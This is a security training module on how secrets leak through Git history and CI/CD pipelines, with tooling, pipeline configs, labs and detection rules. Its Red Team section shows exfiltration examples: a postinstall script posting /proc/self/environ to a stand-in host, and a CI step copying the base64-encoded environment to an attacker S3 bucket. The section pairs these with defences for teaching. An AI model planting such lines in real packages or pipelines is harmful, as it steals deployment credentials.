# 06 — Git & CI/CD Leakage Paths

> **Level:** Intermediate
> **Prereqs:** [05-05 — Env Vars vs Mounted Secrets](./env-vars-vs-mounted-secrets.md); ties with [08-* — IaC Security](../IaC-Security/)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Credential Access, Collection
> **Authorization scope:** Run only against your own test repositories; all tokens in examples are placeholders.

## What & why

Most secret leaks happen via commits, PR previews, build artifacts, and CI environment dumps — not through live infrastructure attacks. A single `git push` with an AWS access key in a `.env` file exposes the key to every collaborator, every fork, and the entire commit history forever. Pre-commit detection catches secrets before they enter the repository.

## The OnPrem reality

Subversion history leaks: `svn cat -r OLD_URL` could retrieve files deleted years ago. Accidentally committed `.htpasswd` files lived in repository history even after `svn delete`. Open archives (`.tar.gz` with secrets in config files) sat on shared NFS mounts. No pre-commit hooks existed in SVN's default workflow — it was post-commit notification (the email list saw your password before you did).

```bash
# SVN history still accessible years later
svn cat -r 847 https://svn.internal.example.com/repo/prod/config/db-creds.properties

# Git reflog — even "removed" commits survive 90 days
git reflog
git show HEAD@{27}:config/database.yml  # Password from 27 commits ago
```

## Tooling landscape

| Tool | Scan target | Language-aware | Entropy detection | CI integration |
|---|---|---|---|---|
| `gitleaks` | Git history, staged, filesystem | Yes (regex rules in TOML) | Yes (generic API key pattern) | GitHub Actions, GitLab CI, pre-commit |
| `truffleHog` | Git history, S3, GCS, filesystem | Yes (800+ detectors) | Yes (base64, hex entropy) | GitHub Actions, CircleCI |
| `detect-secrets` (Yelp) | Staged changes, filesystem | Plugin-based | Yes | pre-commit, baseline files |
| GitHub Advanced Security | All pushes (default branch) | ML + pattern matching | Yes | Native (repo Settings > Security) |
| GitLab Secret Detection | All commits, MRs | Regex + custom rules | Yes | Native (.gitlab-ci.yml include) |
| `pip-audit` / `npm audit` | Dependencies | Python / JS packages | No | CI pipeline step |

**Per-cloud protection:**

| Cloud | Source repo scanning | CI pipeline scanning | Artifact scanning |
|---|---|---|---|
| AWS | CodeCatalyst built-in scan | CodeBuild + `gitleaks` step | ECR scan (`docker scan`) |
| Azure | Azure DevOps secret scanning (CredScan) | Pipeline task: `CredScan@2` | ACR scan |
| GCP | Cloud Source Repositories scan | Cloud Build + `truffleHog` step | Artifact Registry / Container Analysis |
| OnPrem | GitLab EE / Bitbucket Server | Jenkins + `detect-secrets` | Nexus / Artifactory scan |

## AWS

```bash
# AWS CodeCatalyst — secret scanning enabled by default on source repos
# AWS CodeBuild — add gitleaks as a build step

# buildspec.yml
version: 0.2
phases:
  build:
    commands:
      - curl -sSfL https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks_linux_amd64.tar.gz | tar xz
      - ./gitleaks detect --source . --verbose --no-git
      - if [ $? -ne 0 ]; then echo "SECRETS DETECTED — build blocked"; exit 1; fi

# AWS Secrets Manager — scan for secrets referencing leaked patterns
aws secretsmanager list-secrets --region us-east-1 --query "SecretList[].Name"
```

## Azure

```bash
# Azure DevOps — CredScan task in pipeline
# azure-pipelines.yml
steps:
- task: CredScan@2
  inputs:
    toolMajorVersion: 'V2'
    # Blocks build if secrets detected

# GitHub Advanced Security — enable on repo
gh api -X PATCH /repos/example-org/example-repo \
  -f security_and_analysis='{"secret_scanning":{"status":"enabled"},"secret_scanning_push_protection":{"status":"enabled"}}'

# Azure Key Vault — scan for secrets exposed in DevOps logs
az keyvault secret list --vault-name lab-vault-003
```

## GCP

```bash
# Cloud Source Repositories — enable scanning
gcloud source project-configs update --enable-secret-detection

# Cloud Build — add gitleaks step
# cloudbuild.yaml
steps:
- name: 'alpine'
  entrypoint: 'sh'
  args:
  - '-c'
  - |
    wget -q https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks_linux_amd64.tar.gz
    tar xzf gitleaks_linux_amd64.tar.gz
    ./gitleaks detect --source . --verbose --report-format json --report-path gitleaks-report.json
    if [ $? -ne 0 ]; then exit 1; fi

# GCP Secret Manager — audit access patterns
gcloud secrets list
```

## OnPrem — pre-commit + CI configuration

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks
        args: ['--verbose']

  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']
```

```bash
# Install pre-commit
pre-commit install
pre-commit run --all-files
# Blocks commit if gitleaks detects any secrets

# Generate baseline for detect-secrets (existing secrets)
detect-secrets scan > .secrets.baseline
detect-secrets audit .secrets.baseline  # Review and mark false positives
```

**GitHub Actions workflow blocking on findings:**

```yaml
# .github/workflows/secret-scan.yml
name: Secret Scan
on: [push, pull_request]

jobs:
  gitleaks:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Run gitleaks
        uses: gitleaks/gitleaks-action@v2
        with:
          config-path: .gitleaks.toml

      - name: Block on findings
        if: failure()
        run: |
          echo "::error::Secrets detected in commit history — commit blocked"
          exit 1
```

## OnPrem mapping (recap table)

| Concern | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| Pre-commit hook | `.pre-commit-config.yaml` + `gitleaks` | Same | Same | Same |
| CI pipeline step | Jenkins + `gitleaks` | CodeBuild + `gitleaks` | Azure DevOps CredScan | Cloud Build + `truffleHog` |
| Push protection | GitLab / GitHub Server config | CodeCatalyst native | GitHub Advanced Security | CSR native |
| Baseline management | `.secrets.baseline` (detect-secrets) | Same | CredScan suppressions file | Not applicable |
| Custom pattern rules | `.gitleaks.toml` | CodeCatalyst custom patterns | CredScan custom rules | Custom Cloud Build step |

## 🔴 Red Team view

**Live-source attack: `npm package.json` script poisoning CI environment.**

An attacker creates a seemingly innocuous npm package or a PR that adds a `postinstall` script. When CI runs `npm install`, the script executes in the CI environment — which has access to deployment secrets via `${{ secrets.* }}`.

```json
// malicious package.json (PR contribution)
{
  "name": "security-utils",
  "scripts": {
    "postinstall": "curl -X POST https://example.com/collect -d @/proc/self/environ"
  }
}
```

```yaml
# Vulnerable CI step:
- run: npm install
  env:
    AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
    AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
```

**Contained demonstration (local test only):**

```bash
# Simulate: CI environment runs npm install with secrets in env
# Exposed env var gets exfiltrated
echo '{"scripts":{"postinstall":"echo PWNED: $AWS_SECRET_ACCESS_KEY > /tmp/leaked"}}' > /tmp/package.json
AWS_SECRET_ACCESS_KEY="PLACEHOLDER_TEST_KEY_DO_NOT_USE" npm --prefix /tmp install 2>/dev/null
cat /tmp/leaked
# Output: PWNED: PLACEHOLDER_TEST_KEY_DO_NOT_USE
```

**Defensive pair — restrict CI env var scope:**

```yaml
# GitHub Actions: limit env to specific step, not entire job
- name: Deploy
  run: ./deploy.sh
  env:
    DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
  # No other step in this job has access to DEPLOY_TOKEN

# Never do this:
# env:
#   DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}   # Entire job scope
```

**Artifacts left by exfil:**
- GitHub Actions logs: curl outbound in a `postinstall` step (network egress visible)
- Build artifact: S3 upload of generated artifact containing env dump (`PutObject` with unusual filename)
- CloudTrail: `iam:Get*` calls using CI role that normally only uses `s3:PutObject`

**Second scenario: exfil via allowed pipeline channel (S3 upload of build artifact).**

```yaml
# Attacker modifies CI to upload env to their S3 bucket
- run: |
    env | base64 > /tmp/envdump.b64
    aws s3 cp /tmp/envdump.b64 s3://attacker-collection-bucket/env-$(date +%s).b64
```

**Detection paired:**
- CloudTrail alert on `s3:PutObject` to buckets NOT in org's approved bucket list
- CI runner network egress monitoring (e.g., GuardDuty ECS finding on unusual DNS)

## 🔵 Blue Team view

**Pre-commit enforcement (mandatory):**

```bash
# Install gitleaks pre-commit globally for the repo
pre-commit install --install-hooks

# .pre-commit-config.yaml (minimal)
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks
```

**Push protection (GitHub Advanced Security):**

```bash
# Enable push protection via API
gh api repos/example-org/example-repo \
  --method PATCH \
  -f security_and_analysis.secret_scanning_push_protection=enabled

# Result: push containing detected secret formats is BLOCKED
# git push
# remote: error GH013: Repository rule violations found for refs/heads/main.
# remote: — AWS Access Key ID found in src/config.ts
```

**Secret revocation orchestrator pipeline:**

```yaml
# GitHub Action: on secret_scanning_alert webhook → rotate
name: Revoke Leaked Secret
on:
  repository_dispatch:
    types: [secret_scanning_alert]

jobs:
  revoke:
    runs-on: ubuntu-latest
    steps:
      - name: Identify exposed key
        run: |
          echo "Leaked secret type: ${{ github.event.client_payload.alert.secret_type }}"

      - name: Revoke IAM key
        run: |
          aws iam update-access-key \
            --user-name ${{ github.event.client_payload.alert.user }} \
            --access-key-id ${{ github.event.client_payload.alert.key_id }} \
            --status Inactive

      - name: Notify security
        run: |
          aws sns publish \
            --topic-arn arn:aws:sns:us-east-1:111111111111:secret-leak-alerts \
            --message "Secret revoked: ${{ github.event.client_payload.alert.secret_type }}"
```

**CI environment hardening:**

```yaml
# Never pass secrets to insecure steps
- run: npm install  # DO NOT set env: with secrets here

# CI runner should have minimal permissions
# Use GitHub Environments with approval gates for production secrets
# Separation: build jobs run WITHOUT secrets; deploy jobs run WITH locked-down secrets
```

**Detection signals:**
1. GitHub `secret_scanning_alert` webhook event — immediate high severity
2. GitLab `Secret Detection` finding in MR
3. CloudTrail: unusual `s3:PutObject` from CI/CD role to non-corporate bucket
4. Build artifact analysis: scanning for high-entropy strings in job artifacts

## Hands-on lab

See [labs/secret-blind-leak-lab.md](./labs/secret-blind-leak-lab.md) for the full walkthrough.

**Quick local test:**

```bash
# 1. Create a temp repo
mkdir /tmp/secret-test-repo && cd /tmp/secret-test-repo
git init

# 2. Commit a fake secret
echo 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE' > .env
git add .env && git commit -m "Add config"

# 3. Run gitleaks on history
gitleaks detect --source . --verbose --log-opts="--all"
# Expected: finding — AWS Access Key in .env

# 4. Install pre-commit and try to re-commit a secret
cat > .pre-commit-config.yaml << 'EOF'
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks
EOF
pre-commit install
echo 'SECRET_KEY=placeholder-fake-key-999' > secrets.txt
git add secrets.txt && git commit -m "test" 2>&1
# Expected: BLOCKED — gitleaks hook prevents commit

# Teardown
cd /tmp && rm -rf /tmp/secret-test-repo
```

## Detection rules & checklists

```yaml
# Sigma-style: secret in CI build logs
title: CI Build Log Contains Credential Pattern
logsource:
  category: cloud_build_logs
detection:
  keywords:
    - 'AKIA'
    - 'AIza'           # GCP API key prefix
    - 'sk_live_'       # Stripe live key
    - '-----BEGIN RSA PRIVATE KEY-----'
    - 'ghp_'           # GitHub PAT
    - 'glpat-'         # GitLab PAT
  condition: keywords
  severity: critical
```

```bash
# CLI audit: find repos without secret scanning
gh repo list example-org --limit 100 --json name --jq '.[].name' | while read repo; do
  STATUS=$(gh api "repos/example-org/$repo" --jq '.security_and_analysis.secret_scanning.status')
  if [ "$STATUS" != "enabled" ]; then
    echo "NO SCANNING: $repo (status: $STATUS)"
  fi
done

# GitLab: check all projects for secret detection
glab api "projects?per_page=100" --paginate | \
  jq '.[] | select(.security_and_analysis.secret_detection.enabled != true) | .path_with_namespace'
```

## References

- [gitleaks GitHub](https://github.com/gitleaks/gitleaks)
- [truffleHog GitHub](https://github.com/trufflesecurity/trufflehog)
- [Yelp detect-secrets](https://github.com/Yelp/detect-secrets)
- [GitHub Secret Scanning](https://docs.github.com/en/code-security/secret-scanning)
- [GitLab Secret Detection](https://docs.gitlab.com/ee/user/application_security/secret_detection/)
- [AWS CodeCatalyst Secret Scanning](https://docs.aws.amazon.com/codecatalyst/latest/userguide/secret-scanning.html)
- Cross-links: [02-IAM](../IAM/), [08-IaC-Security](../IaC-Security/), [05-07 — Log Redaction](./log-redaction-and-leakage-detection.md)
